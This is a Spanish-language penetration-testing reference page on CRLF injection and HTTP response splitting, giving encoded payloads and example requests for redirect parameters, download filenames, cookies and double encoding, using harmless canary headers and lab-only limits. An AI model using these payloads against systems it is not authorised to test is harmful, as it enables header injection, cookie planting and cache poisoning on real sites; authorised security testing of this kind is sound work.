# 🗡️ CRLF injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Location con cabecera canary

```text
/ok%0d%0aX-Prueba:%20prueba-123
/ok%0aX-Prueba:%20prueba-123
/ok%0dX-Prueba:%20prueba-123
```

**Cuándo usarlo:** Cada línea es un valor para parámetro de redirección, no tres líneas de una respuesta. Inspeccionar cabeceras crudas; CRLF completo es el caso HTTP estándar.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/15-HTTP_Response_Splitting/).


### Control de doble codificación

```text
/ok%0d%0aX-Prueba:%20prueba-123
/ok%250d%250aX-Prueba:%20prueba-123
/ok-X-Prueba-prueba-123
```

**Cuándo usarlo:** Una línea por solicitud. La segunda solo se interpreta como salto si existe una segunda decodificación; el texto reflejado no es nueva cabecera.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/15-HTTP_Response_Splitting/).


## 🧭 Payloads por contexto

### Nombre de archivo en Content-Disposition

```text
informe.txt%0d%0aX-Prueba:%20prueba-123
informe.txt%0aX-Prueba:%20prueba-123
```

**Cuándo usarlo:** Aplicable cuando el nombre se copia a una cabecera de descarga. Verificar si aparece X-Prueba como encabezado separado.

**Fuente:** [PortSwigger](https://portswigger.net/kb/issues/00200200_http-response-header-injection).


### Valor de cookie de respuesta

```text
es%0d%0aX-Prueba:%20prueba-123
es%0d%0aSet-Cookie:%20canary-{NONCE}=1;%20Path=/
```

**Cuándo usarlo:** Solo sobre sesión propia y cookie canary sin privilegios. El navegador puede filtrar Set-Cookie; confirmar en respuesta cruda y estado propio.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/15-HTTP_Response_Splitting/).


## 🔥 Payloads avanzados

### Límite cabecera-cuerpo en laboratorio

```text
/ok%0d%0aX-Prueba:%20prueba-123%0d%0a%0d%0aprueba-123
/ok%250d%250aX-Prueba:%20prueba-123%250d%250a%250d%250aprueba-123
```

**Cuándo usarlo:** Usar únicamente ruta y caché privados de laboratorio; un doble CRLF puede alterar cuerpo/respuesta. No atribuir contaminación de caché sin demostrarla aparte.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/15-HTTP_Response_Splitting/).


## 🔬 Pruebas guiadas por escenario

### 1. CRLF en Location

**Objetivo:** Parámetro que se coloca en la cabecera de una redirección.

```http
GET /redirect?next=%2Fok%0d%0aX-Prueba:%20prueba-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Buscar una cabecera X-Prueba separada en la respuesta cruda; texto dentro de Location no basta.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 2. LF sin CR

**Objetivo:** Algunas cadenas transforman o toleran LF aislado; comparar con CRLF.

```http
GET /redirect?next=%2Fok%0aX-Prueba:%20prueba-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Un nuevo campo HTTP prueba interpretación de salto; muchas pilas rechazan el valor.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 3. Doble codificación

**Objetivo:** Cuando el validador decodifica una vez y el sink otra; probar solo si hay evidencia de doble decode.

```http
GET /redirect?next=%2Fok%250d%250aX-Prueba:%20prueba-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** El `%0d%0a` literal en Location no es éxito; debe convertirse en delimitador final.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 4. Contenido de cabecera de descarga

**Objetivo:** Nombre de archivo devuelto en Content-Disposition, con archivo propio.

```http
GET /download?name=prueba.txt%0d%0aX-Prueba:%20descarga-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comprobar nueva cabecera, no solo un nombre alterado.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 5. Set-Cookie inocua de prueba

**Objetivo:** Solo en cuenta propia y sesión aislada; no modificar cookies de otros.

```http
GET /redirect?next=%2Fok%0d%0aSet-Cookie:%20prueba=123;%20Path=/ HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Confirmar que el navegador almacena solo la cookie marcador; borrar después.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 6. CR aislado

**Objetivo:** Solo en laboratorio, para comprobar una normalización inesperada de CR sin LF en el valor de Location.

```http
GET /redirect?next=%2Fok%0dX-Prueba:%20prueba-123 HTTP/1.1
Host: {LAB_AISLADO}
```

**Interpretación:** HTTP exige CRLF como delimitador; éxito requiere observar una cabecera X-Prueba nueva en la respuesta cruda.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 7. CRLF en ruta reflejada dentro de Link

**Objetivo:** Solo si una cabecera Link usa la ruta solicitada sin codificar.

```http
GET /archivo%0d%0aX-Prueba:%20ruta-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Debe verse una cabecera X-Prueba nueva en la respuesta cruda; un 404 o un eco en HTML no bastan.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 8. Separación de cabecera y cuerpo en laboratorio

**Objetivo:** Un valor de Location vulnerable permitiría dos CRLF; usar servidor y caché aislados.

```http
GET /redirect?next=%2Fok%0d%0aX-Prueba:%20cuerpo-123%0d%0a%0d%0aprueba-123 HTTP/1.1
Host: {LAB_AISLADO}
```

**Interpretación:** Comprobar bytes de la respuesta y longitud declarada; si solo se ve texto dentro de Location, no hubo response splitting.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
